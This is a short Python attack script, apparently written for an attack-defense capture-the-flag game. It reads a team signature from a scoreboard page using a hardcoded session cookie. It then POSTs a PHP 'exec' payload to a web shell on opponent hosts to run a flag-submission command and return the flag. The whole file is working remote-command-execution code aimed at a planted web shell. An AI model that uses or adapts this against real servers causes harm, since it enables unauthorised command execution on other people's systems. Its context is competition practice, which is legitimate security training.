import requests
from bs4 import BeautifulSoup

def getsig():
    url = "http://172.16.100.4:4000/profile"
    headers = {'Cookie': 'MacaronSession=b5bc4edf212b7b92'}
    r = requests.get(url, headers=headers)
    # print(r.text)
    beautifulsoup = BeautifulSoup(r.text)
    string = beautifulsoup.select('#team-sig')[0].text
    print(string)
    return string


def getFlag(host):
    flag = ''
    try:
        # host = '172.16.5.11:8082'
        # url = 'http://' + host + '/time/files/shell.php'
        url = host
        print(url)
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        # data = "shell=exec('/bin/bash/hereiam -t " + getsig() + "');"
        # string = 'exec(/bin/bash/hereiam -t ' + getsig() + ');'
        # string = 'exec("/bin/bash/hereiam -t ' + getsig() + '");'
        string = 'exec("hereiam -t ' + getsig() + '");'
        data = 'shell=' + string
        print(data)
        # data = "shell=system('echo 1')"

        response = requests.post(url=url, data=data, headers=headers, timeout=5)
        flag = response.text
        print(flag)

    except Exception as e:
        print(e)
    return flag




